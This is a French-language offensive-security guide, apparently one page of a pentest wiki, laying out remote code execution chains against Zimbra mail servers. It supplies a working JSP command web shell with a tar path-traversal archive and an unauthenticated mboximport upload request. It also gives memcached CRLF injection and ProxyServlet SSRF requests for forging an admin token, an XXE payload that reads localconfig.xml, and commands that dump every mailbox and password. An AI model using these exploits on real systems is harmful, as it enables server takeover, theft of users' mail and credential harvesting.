---
order: 3
title: "Chaînes de RCE : web shell mboximport, injection memcached, SSRF ProxyServlet et XXE Autodiscover"
description: "Les chaînes d'exécution de code à distance de Zimbra : l'extraction d'archive mboximport non authentifiée qui écrit un web shell JSP sous la racine web via du path traversal tar, l'injection de réponse CRLF memcached qui forge des entrées de route et d'authentification du proxy, le SSRF ProxyServlet atteignant le SOAP admin interne pour émettre un token admin, et le XXE Autodiscover. Requêtes détaillées se terminant par l'exécution de code en tant qu'utilisateur zimbra."
keywords:
  - zimbra rce
  - mboximport web shell
  - zimbra memcached injection
  - proxyservlet ssrf
  - zimbra autodiscover xxe
---

# Chaînes de RCE

Plusieurs failles Zimbra indépendantes se terminent par l'exécution de code sur le serveur, et elles se composent. La plus propre est une seule requête non authentifiée qui extrait un tarball de l'attaquant dans la racine web sous forme de shell JSP. La chaîne plus riche forge un token admin à partir de rien en empoisonnant le cache de routes memcached du proxy et en abusant du SSRF du ProxyServlet pour atteindre le SOAP admin interne, puis utilise ce token (via [DelegateAuthRequest](authentication-bypass.md)) pour administrer le serveur et déposer un shell. Un XXE dans le gestionnaire Autodiscover lit les fichiers du serveur, y compris les clés qui rendent les chaînes de token triviales. Le gain, dans tous les cas, est l'exécution en tant qu'utilisateur **zimbra**, qui possède `zmprov` et `zmmailbox` et donc chaque boîte aux lettres.

Identifiez d'abord le build à partir de l'[énumération](enumeration.md) ; chaque chaîne est liée à la version.

## mboximport : écriture de web shell non authentifiée

L'extension de sauvegarde administrative expose `mboximport`, qui importe une boîte aux lettres depuis une archive téléversée en **extrayant un tar dans un chemin sous le magasin de boîtes aux lettres**. Deux faiblesses se combinent : sur les builds affectés l'endpoint est accessible sans token admin valide, et l'extracteur tar ne confine pas les chemins des membres, donc un membre nommé avec des séquences `../` s'échappe du répertoire prévu et écrit partout où l'utilisateur `zimbra` peut, y compris la racine web Jetty. Un JSP écrit sous un chemin web public est alors exécuté par mailboxd simplement en le demandant.

Construisez un tar dont l'unique membre traverse dans la racine web :

```bash
# shell.jsp runs a command from the ?cmd= parameter
cat > shell.jsp <<'EOF'
<%@ page import="java.util.*,java.io.*"%><%
String c=request.getParameter("cmd");
if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;while((l=r.readLine())!=null)out.println(l);}
%>
EOF
# member path traverses from the import dir into the public webroot
tar cf evil.tar --transform 's,^,../../../../../../opt/zimbra/jetty/webapps/zimbra/public/,' shell.jsp
```

Téléversez-le vers l'endpoint d'import :

```http
POST /service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd HTTP/1.1
Host: target
Content-Type: application/x-tar
Content-Length: <len>

<raw bytes of evil.tar>
```

Puis pilotez le shell planté :

```http
GET /public/shell.jsp?cmd=id HTTP/1.1
Host: target
```

```text
uid=1000(zimbra) gid=1000(zimbra) groups=1000(zimbra)
```

L'identité `zimbra` dans la réponse confirme l'exécution. Le chemin cible du traversal dépend de la disposition d'installation (`/opt/zimbra/jetty/webapps/zimbra/public/` est l'emplacement courant) ; confirmez la racine web d'après le build et ajustez le préfixe `--transform`.

## Injection CRLF memcached + SSRF ProxyServlet vers token admin

Le proxy nginx de Zimbra décide où router un utilisateur en recherchant la route dans **memcached**, indexée par des valeurs dérivées de la requête (le compte, le contexte d'authentification). La recherche est construite en concaténant des chaînes influencées par la requête dans le protocole memcached, qui est délimité par des sauts de ligne. Un **CRLF** non assaini dans cette valeur vous laisse injecter des commandes memcached supplémentaires, écrivant un `set` qui forge une entrée de route ou d'authentification de votre choix, empoisonnant ce à quoi le proxy fait confiance pour une requête ultérieure.

```http
GET /somepath HTTP/1.1
Host: target
# an injected header/value carrying CRLF smuggles a memcached command:
#   ...\r\nset route:admin@target 0 0 <n>\r\n<forged route to internal admin port>\r\n
```

Avec le cache de routes empoisonné, le **ProxyServlet** devient le véhicule de livraison. Le ProxyServlet récupère une URL `target` côté serveur ; là où il ne restreint pas la destination, c'est une server-side request forgery qui atteint des services internes que l'attaquant ne peut pas toucher directement, y compris le SOAP admin lié à localhost :

```http
GET /service/proxy?target=https://127.0.0.1:7071/service/admin/soap HTTP/1.1
Host: target
Cookie: ZM_AUTH_TOKEN=<any-low-priv-token>
```

Routé avec le contexte empoisonné, implicitement de confiance, le SOAP admin interne traite l'`AuthRequest`/`DelegateAuthRequest` proxifié comme un appel de confiance et renvoie un **token admin** dans le corps de la réponse. Ce token est le relais vers le [contournement d'authentification](authentication-bypass.md) : fournissez-le à `DelegateAuthRequest` pour n'importe quelle boîte aux lettres, et au provisioning admin. À partir d'un token admin, atteignez l'exécution de code en configurant un déploiement de `zimlet` ou d'extension, ou associez-le simplement à l'écriture `mboximport` ci-dessus maintenant que le plan admin est à vous.

## XXE Autodiscover (lecture de fichier qui déverrouille les chaînes)

Le gestionnaire Autodiscover / collaboration analyse un corps XML fourni par le client. Là où l'analyseur résout les entités externes, un corps forgé lit des fichiers locaux et les renvoie dans la réponse :

```http
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: target
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY e SYSTEM "file:///opt/zimbra/conf/localconfig.xml"> ]>
<Autodiscover><Request><EMailAddress>&e;</EMailAddress></Request></Autodiscover>
```

Le `localconfig.xml` renvoyé contient les identifiants LDAP et admin et les clés derrière les mécanismes de token ; sa lecture court-circuite l'étape de contournement d'authentification, puisque la **clé preauth** et les secrets admin qu'il expose vous permettent de forger des tokens directement (voir [contournement d'authentification](authentication-bypass.md)).

## Suite : de l'utilisateur zimbra à tout

L'exécution en tant que `zimbra` (depuis le shell JSP) ou un token admin (depuis la chaîne SSRF) atteignent tous deux la compromission totale du système de courrier :

```bash
# as the zimbra user via the JSP shell
zmprov -l gaa                         # list every account in the deployment
zmmailbox -z -m victim@target getRestURL '/inbox/?fmt=zip' > victim.zip   # pull a mailbox
zmprov ga admin@target                # read admin account attributes
zmlocalconfig -s | grep -i pass       # ldap and admin passwords from local config
```

`zmprov` et `zmmailbox` s'exécutent avec une portée administrative complète en tant qu'utilisateur `zimbra`, donc un seul shell vide chaque boîte aux lettres et l'annuaire. L'élévation de privilèges locale vers root depuis le compte `zimbra` est une étape suivante courante via les règles sudo et les helpers setuid que Zimbra installe.

## Notes d'exploitation

- `mboximport` est la victoire en **une seule requête** là où le build est affecté et l'endpoint non authentifié ; confirmez le chemin de la racine web pour la cible du traversal avant de déclencher.
- La chaîne memcached + ProxyServlet nécessite l'**architecture de proxy en place** (c'est généralement le cas) et compose l'empoisonnement de route CRLF avec le SSRF ; sa sortie est un token admin, pas une exécution de code directe, donc finissez avec `DelegateAuthRequest` plus un déploiement ou l'écriture `mboximport`.
- Le XXE Autodiscover est une **lecture de fichier**, précieuse précisément parce que `localconfig.xml` vous remet les clés qui rendent les chaînes de token triviales.
- Tout atterrit en tant que **zimbra**, qui via `zmprov`/`zmmailbox` est déjà game over pour le courrier ; traitez root comme une suite, pas une exigence.

## Outils

- `tar --transform` (GNU tar) pour construire l'archive avec traversal.
- [curl pour le téléversement multipart/tar brut et le rejeu SOAP](https://curl.se/)
- Burp Suite pour les requêtes d'injection CRLF et de SSRF ProxyServlet.

## Références

- [Zimbra security advisories](https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories)
- [Zimbra: zmprov and zmmailbox command reference](https://wiki.zimbra.com/wiki/Zmprov)
- [OWASP: XML external entity (XXE) processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger: server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
